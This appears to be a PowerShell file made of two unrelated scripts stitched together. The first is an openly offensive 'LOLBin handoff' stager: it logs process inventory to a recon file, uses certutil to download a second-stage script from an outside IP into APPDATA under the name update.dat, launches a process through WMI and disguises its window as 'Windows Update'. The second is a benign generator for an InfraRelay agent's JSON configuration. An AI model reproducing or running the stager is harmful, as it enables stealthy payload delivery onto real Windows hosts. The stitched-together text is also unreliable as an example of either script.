
<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.

.EXAMPLE
    PS> .\payload.ps1
#>
$EndpointUrl = 'https://198.51.100.20/stage2.ps1'
$PayloadPath = "$env:APPDATA\update.dat"
$TimeoutSec = 39
$ErrorActionPreference = "Continue"

Write-Verbose "Collecting process inventory"
Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "C:\ProgramData\recon.log" -Append
certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
$ResultObject = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
Write-Verbose ("Process ID: " + $ResultObject.ProcessId)

$Host.UI.RawUI.WindowTitle = "Windows Update"
Write-Output "stage 5 initialized"
#Requires -Version 5.1
<#
.SYNOPSIS
    Generates the InfraRelay JSON configuration for the selected environment.
.DESCRIPTION
    Builds an ordered configuration object, writes it next to the installed
    agent and validates the result by reading it back.
    An existing configuration is backed up before it is replaced, unless the
    Force switch is specified.
.PARAMETER OutputPath
    Defaults to the value configured for this host.
.EXAMPLE
    .\New-AgentConfig.ps1 -Environment Dev
.EXAMPLE
    .\New-AgentConfig.ps1 -ApiPort 9443 -Force
.NOTES
    Author: M. Rahman
    Last updated: 2026-05-19
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$OutputPath = "C:\ProgramData\Contoso\InfraRelay\config.json",

    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', "Test", "Staging", 'Prod')]
    [string]$Environment = 'Dev',
    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 9443,
    [int]$NodeCount = 6,
    [switch]$Force
)

$ErrorActionPreference = 'Stop'

$culture = [System.Globalization.CultureInfo]::InvariantCulture
$DebugPreference = 'SilentlyContinue'
$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.adatum.com/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}

$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "InfraRelay",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
